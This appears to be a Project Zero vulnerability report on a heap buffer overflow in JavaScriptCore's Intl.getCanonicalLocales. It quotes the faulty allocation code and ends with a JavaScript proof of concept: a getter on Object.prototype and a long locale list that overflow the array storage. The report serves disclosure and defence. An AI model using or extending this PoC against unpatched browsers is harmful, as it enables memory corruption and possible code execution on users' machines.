Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1229
 
Here&#039;s tryCreateArrayButterfly which is invoked from intlObjectFuncGetCanonicalLocales to create a JSArray object.
 
inline Butterfly* tryCreateArrayButterfly(VM& vm, JSCell* intendedOwner, unsigned initialLength)
{
    Butterfly* butterfly = Butterfly::tryCreate(
        vm, intendedOwner, 0, 0, true, baseIndexingHeaderForArrayStorage(initialLength),
        ArrayStorage::sizeFor(BASE_ARRAY_STORAGE_VECTOR_LEN));
    if (!butterfly)
        return nullptr;
    ArrayStorage* storage = butterfly->arrayStorage();
    storage->m_sparseMap.clear();
    storage->m_indexBias = 0;
    storage->m_numValuesInVector = 0;
    return butterfly;
}
 
It allocates a fixed size(BASE_ARRAY_STORAGE_VECTOR_LEN) of memory without caring about |initialLength|. So a BOF occurs in the following iteration.
 
EncodedJSValue JSC_HOST_CALL intlObjectFuncGetCanonicalLocales(ExecState* state)
{
    ...
    auto length = localeList.size();
    for (size_t i = 0; i < length; ++i) {
        localeArray->initializeIndex(vm, i, jsString(state, localeList[i]));
        RETURN_IF_EXCEPTION(scope, encodedJSValue());
    }
    ...
}
 
 
PoC:
-->
 
Object.prototype.__defineGetter__(1000, () => 2);
 
let locales = [&#039;mr&#039;, &#039;bs&#039;, &#039;ee-TG&#039;, &#039;ms&#039;, &#039;kam-KE&#039;, &#039;mt&#039;, &#039;ha&#039;, &#039;es-HN&#039;, &#039;ml-IN&#039;, &#039;ro-MD&#039;, &#039;kab-DZ&#039;, &#039;he&#039;, &#039;es-CO&#039;, &#039;my&#039;, &#039;es-PA&#039;, &#039;az-Latn&#039;, &#039;mer&#039;, &#039;en-NZ&#039;, &#039;xog-UG&#039;, &#039;sg&#039;, &#039;fr-GP&#039;, &#039;sr-Cyrl-BA&#039;, &#039;hi&#039;, &#039;fil-PH&#039;, &#039;lt-LT&#039;, &#039;si&#039;, &#039;en-MT&#039;, &#039;si-LK&#039;, &#039;luo-KE&#039;, &#039;it-CH&#039;, &#039;teo&#039;, &#039;mfe&#039;, &#039;sk&#039;, &#039;uz-Cyrl-UZ&#039;, &#039;sl&#039;, &#039;rm-CH&#039;, &#039;az-Cyrl-AZ&#039;, &#039;fr-GQ&#039;, &#039;kde&#039;, &#039;sn&#039;, &#039;cgg-UG&#039;, &#039;so&#039;, &#039;fr-RW&#039;, &#039;es-SV&#039;, &#039;mas-TZ&#039;, &#039;en-MU&#039;, &#039;sq&#039;, &#039;hr&#039;, &#039;sr&#039;, &#039;en-PH&#039;, &#039;ca&#039;, &#039;hu&#039;, &#039;mk-MK&#039;, &#039;fr-TD&#039;, &#039;nb&#039;, &#039;sv&#039;, &#039;kln-KE&#039;, &#039;sw&#039;, &#039;nd&#039;, &#039;sr-Latn&#039;, &#039;el-GR&#039;, &#039;hy&#039;, &#039;ne&#039;, &#039;el-CY&#039;, &#039;es-CR&#039;, &#039;fo-FO&#039;, &#039;pa-Arab-PK&#039;, &#039;seh&#039;, &#039;ar-YE&#039;, &#039;ja-JP&#039;, &#039;ur-PK&#039;, &#039;pa-Guru&#039;, &#039;gl-ES&#039;, &#039;zh-Hant-HK&#039;, &#039;ar-EG&#039;, &#039;nl&#039;, &#039;th-TH&#039;, &#039;es-PE&#039;, &#039;fr-KM&#039;, &#039;nn&#039;, &#039;kk-Cyrl-KZ&#039;, &#039;kea&#039;, &#039;lv-LV&#039;, &#039;kln&#039;, &#039;tzm-Latn&#039;, &#039;yo&#039;, &#039;gsw-CH&#039;, &#039;ha-Latn-GH&#039;, &#039;is-IS&#039;, &#039;pt-BR&#039;, &#039;cs&#039;, &#039;en-PK&#039;, &#039;fa-IR&#039;, &#039;zh-Hans-SG&#039;, &#039;luo&#039;, &#039;ta&#039;, &#039;fr-TG&#039;, &#039;kde-TZ&#039;, &#039;mr-IN&#039;, &#039;ar-SA&#039;, &#039;ka-GE&#039;, &#039;mfe-MU&#039;, &#039;id&#039;, &#039;fr-LU&#039;, &#039;de-LU&#039;, &#039;ru-MD&#039;, &#039;cy&#039;, &#039;zh-Hans-HK&#039;, &#039;te&#039;, &#039;bg-BG&#039;, &#039;shi-Latn&#039;, &#039;ig&#039;, &#039;ses&#039;, &#039;ii&#039;, &#039;es-BO&#039;, &#039;th&#039;, &#039;ko-KR&#039;, &#039;ti&#039;, &#039;it-IT&#039;, &#039;shi-Latn-MA&#039;, &#039;pt-MZ&#039;, &#039;ff-SN&#039;, &#039;haw&#039;, &#039;zh-Hans&#039;, &#039;so-KE&#039;, &#039;bn-IN&#039;, &#039;en-UM&#039;, &#039;to&#039;, &#039;id-ID&#039;, &#039;uz-Cyrl&#039;, &#039;en-GU&#039;, &#039;es-EC&#039;, &#039;en-US-posix&#039;, &#039;sr-Latn-BA&#039;, &#039;is&#039;, &#039;luy&#039;, &#039;tr&#039;, &#039;en-NA&#039;, &#039;it&#039;, &#039;da&#039;, &#039;bo-IN&#039;, &#039;vun-TZ&#039;, &#039;ar-SD&#039;, &#039;uz-Latn-UZ&#039;, &#039;az-Latn-AZ&#039;, &#039;de&#039;, &#039;es-GQ&#039;, &#039;ta-IN&#039;, &#039;de-DE&#039;, &#039;fr-FR&#039;, &#039;rof-TZ&#039;, &#039;ar-LY&#039;, &#039;en-BW&#039;, &#039;asa&#039;, &#039;zh&#039;, &#039;ha-Latn&#039;, &#039;fr-NE&#039;, &#039;es-MX&#039;, &#039;bem-ZM&#039;, &#039;zh-Hans-CN&#039;, &#039;bn-BD&#039;, &#039;pt-GW&#039;, &#039;om&#039;, &#039;jmc&#039;, &#039;de-AT&#039;, &#039;kk-Cyrl&#039;, &#039;sw-TZ&#039;, &#039;ar-OM&#039;, &#039;et-EE&#039;, &#039;or&#039;, &#039;da-DK&#039;, &#039;ro-RO&#039;, &#039;zh-Hant&#039;, &#039;bm-ML&#039;, &#039;ja&#039;, &#039;fr-CA&#039;, &#039;naq&#039;, &#039;zu&#039;, &#039;en-IE&#039;, &#039;ar-MA&#039;, &#039;es-GT&#039;, &#039;uz-Arab-AF&#039;, &#039;en-AS&#039;, &#039;bs-BA&#039;, &#039;am-ET&#039;, &#039;ar-TN&#039;, &#039;haw-US&#039;, &#039;ar-JO&#039;, &#039;fa-AF&#039;, &#039;uz-Latn&#039;, &#039;en-BZ&#039;, &#039;nyn-UG&#039;, &#039;ebu-KE&#039;, &#039;te-IN&#039;, &#039;cy-GB&#039;, &#039;uk&#039;, &#039;nyn&#039;, &#039;en-JM&#039;, &#039;en-US&#039;, &#039;fil&#039;, &#039;ar-KW&#039;, &#039;af-ZA&#039;, &#039;en-CA&#039;, &#039;fr-DJ&#039;, &#039;ti-ER&#039;, &#039;ig-NG&#039;, &#039;en-AU&#039;, &#039;ur&#039;, &#039;fr-MC&#039;, &#039;pt-PT&#039;, &#039;pa&#039;, &#039;es-419&#039;, &#039;fr-CD&#039;, &#039;en-SG&#039;, &#039;bo-CN&#039;, &#039;kn-IN&#039;, &#039;sr-Cyrl-RS&#039;, &#039;lg-UG&#039;, &#039;gu-IN&#039;, &#039;ee&#039;, &#039;nd-ZW&#039;, &#039;bem&#039;, &#039;uz&#039;, &#039;sw-KE&#039;, &#039;sq-AL&#039;, &#039;hr-HR&#039;, &#039;mas-KE&#039;, &#039;el&#039;, &#039;ti-ET&#039;, &#039;es-AR&#039;, &#039;pl&#039;, &#039;en&#039;, &#039;eo&#039;, &#039;shi&#039;, &#039;kok&#039;, &#039;fr-CF&#039;, &#039;fr-RE&#039;, &#039;mas&#039;, &#039;rof&#039;, &#039;ru-UA&#039;, &#039;yo-NG&#039;, &#039;dav-KE&#039;, &#039;gv-GB&#039;, &#039;pa-Arab&#039;, &#039;es&#039;, &#039;teo-UG&#039;, &#039;ps&#039;, &#039;es-PR&#039;, &#039;fr-MF&#039;, &#039;et&#039;, &#039;pt&#039;, &#039;eu&#039;, &#039;ka&#039;, &#039;rwk-TZ&#039;, &#039;nb-NO&#039;, &#039;fr-CG&#039;];
Intl.getCanonicalLocales(locales);

